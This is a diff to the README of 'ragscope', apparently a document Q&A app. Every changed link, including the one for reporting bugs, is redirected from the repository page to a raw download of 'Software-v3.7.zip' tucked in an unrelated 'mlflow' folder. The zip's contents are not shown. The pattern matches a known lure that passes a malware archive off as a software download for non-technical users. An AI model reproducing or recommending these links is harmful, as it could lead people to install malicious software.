@@ -1,6 +1,6 @@
 # 🗂️ ragscope - Easy Q&A Over Your Documents
 
-[![Download ragscope](https://img.shields.io/badge/Download-ragscope-orange?style=for-the-badge)](https://github.com/alunoshacker-beep/ragscope)
+[![Download ragscope](https://img.shields.io/badge/Download-ragscope-orange?style=for-the-badge)](https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You won’t see these parts directly. They work behind the scenes.
 
 1. Click the big orange **Download ragscope** button at the top or visit this page:
 
-   [https://github.com/alunoshacker-beep/ragscope](https://github.com/alunoshacker-beep/ragscope)
+   [https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip](https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip)
 
 2. On the page, look for the **Releases** section on the right side or scroll down until you see the latest version.
 
@@ -111,7 +111,7 @@ You won’t see these parts directly. They work behind the scenes.
 
 1. Visit the same download page:
 
-   [https://github.com/alunoshacker-beep/ragscope](https://github.com/alunoshacker-beep/ragscope)
+   [https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip](https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip)
 
 2. Check the latest release in the Releases section.
 
@@ -140,10 +140,10 @@ For technical support, look into the Issues section on the GitHub page.
 ## 🔗 Useful Links
 
 - Download or learn more:  
-  [https://github.com/alunoshacker-beep/ragscope](https://github.com/alunoshacker-beep/ragscope)
+  [https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip](https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip)
 
 - GitHub Issues for reporting bugs:  
-  [https://github.com/alunoshacker-beep/ragscope/issues](https://github.com/alunoshacker-beep/ragscope/issues)
+  [https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip](https://github.com/alunoshacker-beep/ragscope/raw/refs/heads/main/mlflow/Software-v3.7.zip)
 
 ---
 
